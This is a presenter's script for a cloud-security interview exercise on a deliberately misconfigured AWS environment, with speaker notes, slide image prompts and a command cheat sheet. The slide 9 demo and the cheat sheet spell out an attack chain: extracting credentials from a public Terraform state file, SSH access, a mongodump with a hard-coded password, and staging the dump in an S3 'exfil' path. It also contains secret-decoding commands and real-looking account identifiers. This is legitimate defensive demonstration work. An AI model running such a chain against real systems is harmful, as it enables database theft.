# Wiz Technical Exercise — Presentation Script
# 30 minutes presentation + 15 minutes Q&A

---

## Visual style guidance for all ChatGPT image prompts
- Dark navy background (#0a0e1a) for full-bleed slides
- Dark charcoal (#1e2433) for content cards and boxes
- Electric blue (#00B4D8) for arrows, accents, highlights
- Red (#FF4444) for warnings, security findings, critical items
- Green (#00C875) for resolved, positive, compliant items
- White text on dark backgrounds
- Flat vector illustration style — no 3D, no photo-realism, no gradients except subtle glows
- Clean, modern, enterprise security aesthetic inspired by Wiz.io visual language
- All images 16:9 widescreen format

---

## BEFORE YOU START — Meeting management checklist
- Ask for introductions round: "Before I dive in, I'd love to go around and hear who's joining and what you're most curious to see"
- Take notes as people answer
- Adjust depth of technical content based on audience
- Ask for feedback at the end
- Follow up by email after the call

---

## Slide 1 — Title (1 min)

**Speaker notes:**
"Good morning / afternoon everyone. Thank you for having me. Before I dive in — I'd love to quickly go around and hear who's joining today and what you're most curious to see. That way I can make sure I address what matters most to each of you."

*(Take notes as people answer)*

**Slide content:** Title: "Securing a Cloud-Native Application on AWS". Subtitle: "A DevSecOps Exercise — Oleksii Androsov"

**ChatGPT image prompt:**
Dark navy background (#0a0e1a). Centered composition. A stylized AWS cloud architecture diagram rendered as glowing neon lines on dark background — showing a Kubernetes cluster icon, a database cylinder, an S3 bucket, and a load balancer connected by flowing electric-blue (#00B4D8) lines. Flat vector illustration style, no gradients except subtle blue glow effects. No text. Modern enterprise security aesthetic inspired by Wiz.io. 16:9 widescreen format.

---

## Slide 2 — Agenda (1 min)

**Speaker notes:**
"Here's the plan for the next 30 minutes. The task I was given, then the architecture and a live demo. From there the DevSecOps pipeline, the security findings, and how Wiz would change the picture. I'll close with what I'd do differently and what I learned. Questions at the end — but feel free to interrupt."

**Slide content:** Numbered agenda list:
1. The Task
2. Architecture
3. Live Demo
4. DevSecOps Pipeline
5. Security Findings & The Value of Wiz
6. What I'd Do Differently & What I Learned
7. Q&A

**ChatGPT image prompt:**
Minimal vertical agenda layout on dark navy background (#0a0e1a). Seven numbered items in a clean vertical list, each on its own row. Numbers in large electric blue (#00B4D8) circles on the left, item text in white on the right. Items: "1 The Task", "2 Architecture", "3 Live Demo", "4 DevSecOps Pipeline", "5 Security Findings & The Value of Wiz", "6 What I'd Do Differently & What I Learned", "7 Q&A". Row 7 slightly muted/lighter to indicate it's after the main presentation. Clean sans-serif typography, generous spacing between rows. No decorative elements. 16:9 widescreen.

---

## Slide 3 — The Task (2 min)

**Speaker notes:**
"Let me start with what I was actually asked to do — because the task itself is interesting and explains every architectural decision you'll see.

The assignment was to deploy a two-tier cloud application — a containerized web app backed by a MongoDB database — using modern DevOps practices. But with a twist: several components had to be deliberately misconfigured. The database server had to run an outdated version of MongoDB on an outdated Linux OS, with SSH exposed to the internet and an overly permissive cloud role. The storage bucket for database backups had to be publicly readable.

The containerized application had to be assigned a Kubernetes cluster-admin role — which in practice means the running container has full control over the entire Kubernetes cluster.

On top of that, I had to build a full CI/CD pipeline with security scanning at each stage, and implement AWS-native security controls to detect the misconfigurations.

The goal of all of this is to simulate the kind of environment that security teams encounter in the real world — where applications are built under delivery pressure, security is treated as an afterthought, and the attack surface is much larger than anyone realizes. And then to demonstrate how you'd find and communicate those risks."

**Slide content:** Task summary with key requirements highlighted

**ChatGPT image prompt:**
Split two-column layout on dark navy background (#0a0e1a). Left column header: "The Requirements" — bulleted list items in white with small electric blue bullet dots: "Containerized app on Kubernetes", "MongoDB on EC2 (outdated)", "CI/CD pipeline with security scanning", "AWS-native security controls". Right column header: "Intentional Weaknesses" — same list style but bullet dots are red warning triangles: "SSH open to internet", "Overly permissive IAM role", "Public S3 bucket", "Cluster-admin pod role", "Outdated OS + DB versions". Both columns in dark charcoal (#1e2433) rounded card. Thin electric blue border on left column, thin red border on right column. White text throughout. Clean, minimal. 16:9 widescreen.

---

## Slide 4 — The Solution — Architecture (2 min)

**Speaker notes:**
"Here's what I built. The application is called MovieBuddy — an AI-powered movie recommendation chatbot. I chose it because it's a genuinely useful multi-agent system rather than a toy app, which makes the demo more meaningful. It uses Claude Sonnet as the AI backbone, Tavily for live web search, and TMDB for movie posters.

Architecturally: traffic comes in through an AWS Application Load Balancer with HTTPS termination via ACM certificates. The load balancer routes to a Kubernetes pod running on EKS — in private subnets. The pod connects to MongoDB on an EC2 instance for persistent user memory. Database backups run daily to S3.

The red warning icons you can see on the diagram are the intentional weaknesses — we'll come back to each of them when we look at the security findings."

*(Point to each component on the diagram as you describe it)*

**Slide content:** Architecture diagram image

**ChatGPT image prompt:**
AWS architecture diagram on dark navy background (#0a0e1a). Dark style matching Wiz.io aesthetic. Layout left to right.

Outside AWS (far left): Internet User icon → Namecheap DNS icon → these connect via electric blue arrow into the AWS boundary.

Inside a large outer box labeled "AWS Cloud" (with the official orange AWS logo top-left of the box): everything below is inside this box.

Inside AWS Cloud, a large green-bordered box labeled "VPC". Inside the VPC:
- Left section: Application Load Balancer icon with padlock (HTTPS/ACM label). This is inside the VPC.
- Center section: a box labeled "Amazon EKS Cluster" (Kubernetes wheel icon, blue border). Inside it, two dashed boxes side by side labeled "Private Subnet" each with a lock icon. Inside the left private subnet: a Kubernetes pod icon labeled "MovieBuddy (Kubernetes Pod)" with a red warning label below: "⚠ cluster-admin privileges".
- Right section inside VPC: a dashed orange-bordered box labeled "Public Subnet". Inside it: EC2 instance icon labeled "EC2 Instance" with MongoDB leaf icon below labeled "MongoDB". Two red warning labels: "⚠ SSH open to Internet" and "⚠ Overpermissive IAM Role".

Still inside AWS Cloud but outside the VPC box: Amazon S3 bucket icon labeled "Amazon S3 — Backups" with red warning label "⚠ Public bucket".

Traffic flow arrows in electric blue (#00B4D8): Internet User → DNS → ALB → MovieBuddy Pod → EC2/MongoDB → S3.

Bottom of slide: two small info boxes — "Infrastructure as Code / Terraform" (purple Terraform icon) and "CI/CD / GitHub Actions" (green Actions icon).

Bottom-right legend box: blue arrow = Traffic Flow, red triangle = Security Weakness, green lock = Encrypted/Secure.

Flat vector style, no gradients, no 3D. White text labels throughout. 16:9 widescreen.

---

## Slide 5 — Live Demo — The Application (5 min)

**Speaker notes:**
"Let me show you the application live."

*(Switch to browser — open https://movie-buddy.app)*

"This is MovieBuddy — running on Kubernetes, over HTTPS. Four specialist AI agents working in parallel, Claude Sonnet as the backbone, live web search via Tavily, movie posters from TMDB."

*(Ask: "What's a good family film for a rainy evening with kids aged 8 and 12?" — show the response)*

"Preferences are stored in MongoDB so the app remembers you. Let me prove the data is actually there."

*(Run in terminal)*
```bash
kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') \
  -- python3 -c "
from pymongo import MongoClient
import os, json
c = MongoClient(os.environ['MONGO_URL'])
docs = list(c.movie_buddy.profiles.find({}, {'_id': 0}))
print(json.dumps(docs, indent=2, default=str))
"
```

"Profile data, persisted in MongoDB. Now let me show you what's running under the hood."

```bash
kubectl get pods -o wide
```

*(Switch to AWS Console — EC2 → Instances → movie-buddy-mongodb)*

"The MongoDB server — EC2 in a public subnet, public IP, Ubuntu 20.04. Note the public subnet and public IP. We'll come back to why that matters."

**Slide content:** App mockup image + 3 bullet points: "Multi-agent AI (Claude Sonnet)" | "EKS on AWS, HTTPS" | "MongoDB persistent memory"

**ChatGPT image prompt:**
Dark-themed chat UI mockup illustration. Split composition: left two-thirds shows a chat interface with dark background (#1e2433), a conversation about movie recommendations, movie poster thumbnails arranged in a row, and four colored specialist agent badges at the top (blue "Tracker", green "Explorer", orange "Fact-Checker", purple "Planner"). Right one-third shows a sidebar panel with user profile data — genre preferences, kids ages, streaming platforms listed. Electric blue and purple accent colors. Clean sans-serif typography feel. Flat design illustration, not a screenshot. 16:9 widescreen.

---

## Slide 6 — How I Built It — DevSecOps Pipeline — LIVE DEMO (5 min)

**Speaker notes:**
"I built this using a full DevSecOps pipeline. Let me show you how it works."

*(Switch to GitHub — show repo structure briefly)*

"Everything lives in GitHub. Infrastructure code in the infra folder, application code in the app folder, Kubernetes manifests in k8s, and two GitHub Actions workflows."

*(Switch to GitHub Actions — show both workflows)*

"The infrastructure pipeline triggers whenever I push a change to a Terraform file. It runs Checkov — an IaC security scanner — then generates a Terraform plan showing exactly what will change in AWS, pauses for manual approval, and only then applies the changes. No infrastructure change can reach production without a human reviewing both the security findings and the plan."

*(Click into the Infra CI run — show Checkov findings, show the approval gate)*

"The app pipeline builds the image first, then Trivy scans it before it goes anywhere near ECR. 14 vulnerabilities found — two critical CVEs in perl, high-severity in ncurses and SQLite. Because we output SARIF format, GitHub renders them in the Security tab."

*(Switch to GitHub repo → Security → Code scanning — show briefly)*

"Findings directly where developers work. In production you'd set exit-code 1 — push blocked until resolved.

One more thing to flag: Terraform remote state. Terraform keeps a record of everything it's deployed — resource IDs, addresses, and any credentials it used. When the pipeline runs in GitHub, it can't access my laptop, so I moved that file to S3. Right call for CI/CD. But I made the bucket public — and that state file contains database credentials in plain text. We'll come back to that."

*(If asked — why does tfstate contain credentials?)*
*"Terraform stores credentials so it can detect drift — compare what's in code against what's actually deployed. It doesn't encrypt state by default. Known limitation."*

*(If asked — why S3 and not GitHub-native?)*
*"GitHub has no built-in Terraform state storage. S3 is the standard AWS choice. The better option is Terraform Cloud, which encrypts state and controls access. The mistake wasn't S3 — it was making the bucket public."*

"Secrets live in two places: AWS credentials for the pipeline are in GitHub Secrets, never in code. Application secrets — API keys and the MongoDB URL — are in a Kubernetes Secret, injected as environment variables at pod startup."

**Slide content:** Pipeline flow diagram image

**ChatGPT image prompt:**
Horizontal pipeline flow diagram on dark navy background (#0a0e1a). Two parallel pipeline tracks stacked vertically, each with a label on the left. Top track labeled "Infra Pipeline": connected boxes left to right — "Git Push" → "Checkov Scan" (red security shield icon) → "Terraform Plan" (document icon) → "Manual Approval" (human/pause icon, amber color) → "Terraform Apply" → "AWS" (cloud icon). Bottom track labeled "App Pipeline": "Git Push" → "Docker Build" → "Trivy Scan" (red shield, scans the built image) → "ECR Push" → "kubectl rollout" → "EKS" (Kubernetes wheel icon). Electric blue (#00B4D8) arrows connecting boxes. Boxes in dark charcoal (#1e2433) with white text. Security scan steps have red accent border, deploy steps have green accent border. Note: Trivy scan sits between Build and Push — image is scanned before it reaches ECR. Flat vector style. 16:9 widescreen.

---

## Slide 7 — Business Benefits and Risks (2 min)

**Speaker notes:**
"Before we look at findings — the business context.

This environment deploys in 30 minutes from a single Terraform command. Fully automated, reproducible, horizontally scalable. That's real value.

But it was built with five intentional weaknesses — and I want to show they're real, not hypothetical."

```bash
# SSH open to the entire internet
aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
  --query "SecurityGroups[0].IpPermissions" --output table

# AdministratorAccess on the EC2 role
aws iam list-attached-role-policies \
  --role-name movie-buddy-ec2-role \
  --query "AttachedPolicies[*].PolicyName" --output table

# Cluster-admin on the Kubernetes pod
kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
```

"Open SSH — anyone on the internet can try to get in. AdministratorAccess — one compromised VM equals a compromised AWS account. Cluster-admin on the pod — code execution in the container means full control of Kubernetes. Plus a public S3 bucket and an OS and database both over a year out of date. Let's see what the security tools made of this."

**Slide content:** Two columns — Benefits | Risks

**ChatGPT image prompt:**
Two-panel infographic on dark navy background (#0a0e1a). Left panel labeled "Business Value" — three items each with a green checkmark circle icon: "Automated Deployment", "Horizontally Scalable", "Full Audit Trail". Right panel labeled "Security Risks" — four items each with a red warning triangle icon: "SSH Exposed to Internet", "Over-Privileged IAM Role", "Credentials in Public S3", "Unpatched CVEs". Vertical electric blue (#00B4D8) dividing line between panels. White text, flat icon style. No decorative elements. Clean enterprise look. 16:9 widescreen.

---

## Slide 8 — Security Findings — LIVE DEMO (8 min)

**Speaker notes:**
"Five tools, five angles. Let me walk through what each one found."

*(Switch to GitHub Actions → Infra CI run → Checkov step)*

"Checkov runs before anything touches AWS. 10 findings — the two that matter most: SSH open to the internet, AdministratorAccess on EC2. Soft-fail here intentionally so the pipeline still ran — in production these would block it."

*(Switch to AWS Console → Inspector → filter by EC2, Critical)*

"Inspector scanned the EC2 and found 26 critical CVEs. Not 'Ubuntu is old' as a single flag — it lists every package on that machine with a known vulnerability. The one I want to highlight:"

*(Click into the libssh / libssh-4 finding)*

"Critical CVE in libssh — the SSH library — on the same machine where port 22 is open to the internet. Not just the port is exposed, but the SSH implementation itself is vulnerable."

*(Switch to Inspector → filter by ECR Container Image)*

"ECR: critical CVE in perl in the running container image. Inspector gives CVE IDs and severity scores but can't tell you if these are actually reachable from outside."

*(Switch to AWS Console → GuardDuty → Findings)*

"GuardDuty watches for suspicious behavior — not misconfigurations, but actions. Two findings: public access was granted to the S3 bucket, and Block Public Access was disabled. Same bucket that Checkov and Config flagged — but GuardDuty caught the act of making it public. Three tools, same bucket, three completely different signals. None talking to each other."

*(Switch to AWS Console → Config → Rules)*

"Config runs two compliance rules I deployed via Terraform. SSH open to internet: non-compliant. Public S3 bucket: non-compliant. Same findings as Checkov — but Config catches them on the live resource continuously, even if someone bypasses the pipeline and changes things manually."

*(Switch to AWS Console → CloudTrail)*

"CloudTrail is the audit log — every API call, who made it, when, from which IP. If something goes wrong, this is where the investigation starts.

So: five tools, 40+ findings. The question is — which one do I fix first? And do any of these connect into something worse than each one individually?"

**Slide content:** Security findings dashboard image

**ChatGPT image prompt:**
Security findings dashboard on dark navy background (#0a0e1a). Five tool labels as column headers in a row across the top: "Checkov", "Trivy", "AWS Inspector", "GuardDuty", "AWS Config / CloudTrail". Below each header, 2 finding cards in dark charcoal (#1e2433). Cards have colored left-border severity indicator: red = CRITICAL, orange = HIGH. Finding labels in white text: under Checkov — "SSH open 0.0.0.0/0", "AdministratorAccess IAM"; under Trivy — "perl: Critical CVE", "ncurses: High CVE"; under Inspector — "26 Critical CVEs (EC2)", "libssh Critical CVE"; under GuardDuty — "S3 Public Access Granted (High)", "Block Public Access Disabled (Low)"; under Config/CloudTrail — "SSH rule: NON_COMPLIANT", "S3 public read: NON_COMPLIANT". Bottom center: large badge "40+ Findings Detected" in red. Flat design, no gradients. 16:9 widescreen.

---

## Slide 9 — What Value Would Wiz Provide — LIVE DEMO (5 min)

**Speaker notes:**
"None of those tools can answer that question. Let me show you why — concretely."

*(Open browser — navigate to the Terraform state bucket, no login required)*
```
https://movie-buddy-tfstate-472151629584.s3.amazonaws.com/
```

"This is the bucket that holds the Terraform state file. It's publicly readable — no credentials required, no AWS account needed. Just a browser. Watch what's inside."

*(Run in terminal)*
```bash
aws s3 cp s3://movie-buddy-tfstate-472151629584/wiz-exercise/terraform.tfstate - \
  | python3 -m json.tool | grep -A3 mongodb_url
```

"The Terraform state file contains the MongoDB connection string — username and password — in plain text. Now watch how far this goes."

*(Run in terminal — SSH into EC2)*
```bash
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128
```

"Port 22 is open to the entire internet. I'm in. Now I dump the entire database — and to exfiltrate it, I don't need my own AWS credentials. The EC2 has AdministratorAccess attached. I just use the machine's own identity."

*(Run inside EC2 shell)*
```bash
mongodump --host localhost --port 27017 \
  -u admin -p 'MovieBuddy2024!' --authenticationDatabase admin \
  --db movie_buddy --out /tmp/exfil

tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil

aws s3 cp /tmp/movie_buddy_dump.tar.gz \
  s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz
```

*(Back in local terminal — confirm the dump landed)*
```bash
aws s3 ls s3://movie-buddy-tfstate-472151629584/exfil/
```

"The entire customer database is now in S3 — staged using your own cloud account. No credentials of their own at any step.

Three weaknesses chained: public S3 exposed the credentials. Open SSH got them in. AdministratorAccess IAM role meant they didn't need their own AWS credentials to exfiltrate.

Checkov flagged the bucket. It flagged the IAM role. Inspector flagged the SSH port. But no tool said: these three connect into a complete attack path. That's the gap.

Wiz builds a graph of your entire environment — every resource, every permission, every network path — and identifies which combinations of findings create real attack paths. Instead of 40 isolated findings, you get three prioritized attack paths. Your team fixes what actually matters, not what shows up first in a list.

You can keep adding tools — Semgrep, KICS, others. Each adds signal but also another dashboard. Wiz sits above all of them and gives you one view with the context to act."

**Slide content:** Fragmentation vs unified view image

**ChatGPT image prompt:**
Split composition on dark navy background (#0a0e1a). Left half labeled "Without Wiz" (muted, slightly gray tint): Six isolated tool icons scattered — Checkov, Trivy, Inspector, GuardDuty, Config, CloudTrail — each in its own separate dark box with no connections between them, red warning icons floating disconnected, chaotic arrangement suggesting fragmentation and alert fatigue. Right half labeled "With Wiz" (vivid, full color): A clean connected graph — six nodes in a horizontal chain connected by glowing red attack path arrows: "Public Internet" → "Public S3 Bucket" → "Exposed Credentials" → "Open SSH (0.0.0.0/0)" → "EC2 + Admin IAM Role" → "Data Exfiltrated to S3". Each node is a dark charcoal (#1e2433) rounded box with white label. The final node "Data Exfiltrated to S3" has a red glow/border to emphasize the blast radius. Below the chain: "1 Critical Attack Path — 3 Chained Weaknesses" in bold red. Vertical dividing line in electric blue (#00B4D8) between the two halves. Flat vector style. 16:9 widescreen.

---

## Slide 10 — Challenges & What I Learned (3 min)

**Speaker notes:**
"Building this wasn't without friction — and the friction is where the real learning happened. Let me walk through both.

Four technical challenges I hit:

First — cross-platform Docker builds. My Mac runs ARM64, EKS runs AMD64. The container built fine locally and crashed immediately on Kubernetes. Fixed with docker buildx and the --platform linux/amd64 flag. This taught me that container portability isn't automatic — you have to be explicit about target architecture.

Second — the AWS Load Balancer Controller couldn't discover my subnets because they were missing required Kubernetes cluster tags. I had to add those tags via Terraform and explicitly pin subnet IDs in the ingress. This taught me that the ALB controller has very specific expectations about subnet tagging, and when those aren't met, the error messages are not obvious.

Third — Streamlit uses WebSockets for its live UI. Behind an ALB without sticky sessions, every page refresh broke the connection. Fixed with sticky session annotations on the ingress. This taught me that not all HTTP traffic behaves the same — WebSocket applications have specific load balancer requirements.

Fourth — Terraform state. The CI/CD pipeline had no access to state on my laptop. Migrating to S3 made the pipeline work — but also revealed a security issue: the state file contains credentials in plain text, and I'd put it in a public bucket. That mistake became the strongest demo moment in the presentation.

What I took away from the exercise overall: the most interesting security findings in this environment weren't the obvious ones — open SSH, outdated software. The most dangerous finding emerged from the combination of two seemingly unrelated decisions: a public S3 bucket and Terraform remote state. Neither decision is alarming on its own. Together they create a complete attack path. That's the insight that made the Wiz value proposition click for me — it's not about finding more things, it's about connecting the things you already know."

**Slide content:** Four challenge cards + key learning callout

**ChatGPT image prompt:**
Two-section layout on dark navy background (#0a0e1a). Top section: four-card horizontal row — cards in dark charcoal (#1e2433) rounded rectangles. Card 1: Docker whale icon — "ARM→AMD64 Builds". Card 2: network icon — "ALB Subnet Tags". Card 3: lightning icon — "WebSocket + Sticky Sessions". Card 4: database/cloud icon — "Terraform Remote State". Each card has a small amber dot top-right (challenge) and green checkmark bottom-right (resolved). Electric blue border on each card. Bottom section: single wide callout card with electric blue left border and slightly lighter background. Bold white text: "Key Insight" label, then smaller text: "The most dangerous finding came from combining two unrelated decisions — not from any single misconfiguration." Flat vector style, white text. 16:9 widescreen.

---

## Slide 11 — What Would You Do Differently (2 min)

**Speaker notes:**
"If I were hardening this for production, four changes in priority order:

First — AWS Secrets Manager with the External Secrets Operator. Right now, credentials live in Kubernetes Secrets and in the Terraform state file — both in plain text. Secrets Manager stores them encrypted in AWS, rotates them automatically, and the External Secrets Operator syncs them into Kubernetes at runtime. The credential never sits in a file anywhere.

Second — IMDSv2 on EC2 and immutable ECR image tags. The instance metadata service is what I queried in the attack simulation — that curl to 169.254.169.254 that returned AWS credentials. IMDSv2 adds a required session token to that request, which blocks the most common way attackers steal instance credentials remotely without being on the machine. Immutable ECR tags mean once an image is scanned and pushed, no one can overwrite that tag with a different image — the scan result stays valid.

*(If asked about IMDSv2 in more detail)*
*"The classic attack is SSRF — Server Side Request Forgery. An attacker tricks the application into making a request to the metadata URL on its behalf. With IMDSv1, that single request returns credentials. IMDSv2 requires a PUT request first to get a session token, which SSRF attacks typically can't do. One config line in Terraform: http_tokens = required."*

Third — OIDC federation instead of static AWS credentials in GitHub Secrets. Right now, the pipeline uses a long-lived access key stored in GitHub. If that key leaks, an attacker has permanent AWS access until someone rotates it. OIDC federation means GitHub requests a short-lived token from AWS for each pipeline run — it expires in minutes, nothing is stored anywhere.

*(If asked about OIDC)*
*"GitHub and AWS trust each other via OpenID Connect. GitHub says 'I am this repo, running this workflow' and AWS issues a temporary credential scoped to a specific IAM role. No key to store, no key to rotate, no key to leak."*

Fourth — move MongoDB to a private subnet with no public IP, and add a VPC endpoint for S3. Currently the EC2 is in a public subnet with a routable IP — that's what made SSH from the internet possible. Moving to a private subnet removes the public IP entirely. The machine can't be reached from outside AWS at all, even with port 22 open. But that creates a new problem: the daily backup script uses the AWS CLI to copy backups to S3, and a private subnet has no internet gateway route — so that call would break. A VPC S3 endpoint solves this by creating a private route directly from the VPC to S3, without traffic ever leaving the AWS network.

*(If asked about VPC endpoints)*
*"Our pod-to-MongoDB communication already stays inside the VPC via private IPs — that's working correctly. The VPC endpoint is specifically for EC2-to-S3 traffic. Without it, the backup script would have to go out through the internet to reach S3. The endpoint keeps that traffic private and is a prerequisite for the private subnet move to work end-to-end."*"

**Slide content:** Four-step roadmap image

**ChatGPT image prompt:**
Four-step improvement roadmap on dark navy background (#0a0e1a). Horizontal timeline with four numbered circular nodes (1, 2, 3, 4) connected by a progress bar line. Color gradient from amber/orange on the left (current state) to bright green on the right (target state). Node 1 (amber): key/lock icon — "Secrets Manager + ESO" label below. Node 2: shield icon — "IMDSv2 + Immutable ECR". Node 3: chain/link icon — "OIDC Federation". Node 4 (green): network diagram icon — "Private Subnet + VPC Endpoints". Below each node, a small dark charcoal (#1e2433) card with 2-line description. Above the timeline: "Current State" label on far left, "Production Ready" on far right. Flat vector style, white text. 16:9 widescreen.

---

## Slide 12 — Close / Q&A (1 min)

**Speaker notes:**
"That brings me to the end of the presentation. To summarise: I built a real, working cloud-native application, deliberately introduced the security weaknesses the exercise required, built a DevSecOps pipeline that surfaces those weaknesses automatically, and implemented AWS-native controls for detection and audit. And I showed you how the fragmentation of findings across those tools is exactly the problem Wiz was built to solve.

I'd love to open it up for questions — and I'd genuinely appreciate your feedback. Is there anything you'd like me to go deeper on, or anything you'd have done differently?"

*(After Q&A, close with:)*
"Thank you all for your time. I'll follow up by email with the GitHub repository link. Looking forward to the next steps."

**Slide content:** "Thank you" + GitHub repo URL + contact email

**ChatGPT image prompt:**
Minimal closing slide on dark navy background (#0a0e1a). Center-aligned composition. Large white text "Thank You" at top. Below, two lines in electric blue (#00B4D8): a GitHub icon with "github.com/oleksii-androsov/ai-learning" and an envelope icon with "oleksiiandrosov85@gmail.com". Below those, in smaller white text: "Questions & Discussion". Subtle glowing electric blue horizontal line separating "Thank You" from the contact details. Clean, understated, professional. No other decorative elements. 16:9 widescreen.

---

## DEMO CHEAT SHEET — Commands to have ready in terminal

### Kubernetes — app and infrastructure
```bash
# Show running pod and which node it's on
kubectl get pods -o wide

# Show all key K8s objects at once
kubectl get deployment,service,ingress,clusterrolebinding | grep movie-buddy

# Show ingress details (ALB hostname, certificate ARN, annotations)
kubectl describe ingress movie-buddy-ingress

# Show secrets exist (values hidden by Kubernetes)
kubectl get secret movie-buddy-secrets -o jsonpath='{.data}' | python3 -m json.tool

# Decode a specific secret value (e.g. anthropic_api_key)
kubectl get secret movie-buddy-secrets -o jsonpath='{.data.anthropic_api_key}' | base64 -d

# Show cluster-admin role binding (intentional weakness)
kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
```

### wizexercise.txt — proof the file is in the container
```bash
# Show the file exists and contains your name
kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- cat /app/wizexercise.txt
```
*(Have this ready if challenged — not required to show proactively unless asked)*

### MongoDB — prove data is persisted
```bash
# Show profile data saved in MongoDB
kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].metadata.name}') -- python3 -c "
from pymongo import MongoClient; import os, json
c = MongoClient(os.environ['MONGO_URL'])
docs = list(c.movie_buddy.profiles.find({}, {'_id': 0}))
print(json.dumps(docs, indent=2, default=str))
"
```

### MongoDB backups — prove automated backups are running
```bash
# Show backup files exist in S3 (one per day since June 13)
aws s3 ls s3://movie-buddy-db-backups-472151629584/

# Show the backup script itself
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /usr/local/bin/backup-mongodb.sh"

# Show the cron job that runs it at 2am daily
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /etc/cron.d/mongodb-backup"
```
*(Have these ready if challenged — show the S3 listing proactively during the attack path demo)*

### Intentional weaknesses — live proof
```bash
# SSH open to entire internet — show security group rule
aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
  --query "SecurityGroups[0].IpPermissions" --output table

# AdministratorAccess IAM role on EC2
aws iam list-attached-role-policies \
  --role-name movie-buddy-ec2-role \
  --query "AttachedPolicies[*].PolicyName" \
  --output table

# Cluster-admin ClusterRoleBinding on the pod
kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
```

### EC2 / MongoDB server
```bash
# SSH to MongoDB server (demonstrates open SSH to internet — intentional weakness)
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128

# Check MongoDB version (outdated — intentional)
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "mongod --version"

# Check OS version (Ubuntu 20.04 — over 1 year outdated — intentional)
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "lsb_release -a"

# Show overly permissive security group (SSH open to 0.0.0.0/0)
aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
  --query "SecurityGroups[0].IpPermissions" --output table

# Show AdministratorAccess IAM policy attached to the EC2 role
aws iam list-attached-role-policies \
  --role-name movie-buddy-ec2-role \
  --query "AttachedPolicies[*].PolicyName" \
  --output table
```

### Attack path demo — public S3 → credentials → SSH → full database exfiltration
```bash
# Step 1: Show S3 bucket is publicly readable (open in browser, no credentials)
# URL: https://movie-buddy-db-backups-472151629584.s3.amazonaws.com/

# Step 2: Show Terraform state file is in the public bucket
aws s3 ls s3://movie-buddy-tfstate-472151629584/wiz-exercise/

# Step 3: Extract MongoDB credentials from state file (no auth required)
aws s3 cp s3://movie-buddy-tfstate-472151629584/wiz-exercise/terraform.tfstate - \
  | python3 -m json.tool | grep -A3 mongodb_url

# Step 4: SSH into the EC2 server — SSH is open to the entire internet (second weakness)
# Note: say out loud "In practice an attacker would brute-force this or exploit a MongoDB CVE.
# The point is: port 22 is open to 0.0.0.0/0, so they can try."
ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128

# Step 5 (run INSIDE the EC2 shell): Dump the entire database
# Use 'mongo' not 'mongosh' — MongoDB 4.4 uses the old shell
mongodump --host localhost --port 27017 \
  -u admin -p 'MovieBuddy2024!' --authenticationDatabase admin \
  --db movie_buddy --out /tmp/exfil

# Step 6 (run INSIDE the EC2 shell): Exfiltrate to S3 — no AWS credentials needed
# The EC2 has AdministratorAccess IAM role, so the AWS CLI just works (third weakness)
tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
aws s3 cp /tmp/movie_buddy_dump.tar.gz \
  s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz

# Step 7 (back in your local terminal): Confirm the dump landed in S3
aws s3 ls s3://movie-buddy-tfstate-472151629584/exfil/
```
*(This chains THREE weaknesses: public S3 exposes credentials → open SSH port 22 provides server access → AdministratorAccess IAM role means no AWS credentials needed to exfiltrate. Say out loud: "An attacker with a browser, an SSH client, and the AWS CLI just dumped your entire customer database to external storage — using your own cloud account to do it.")*
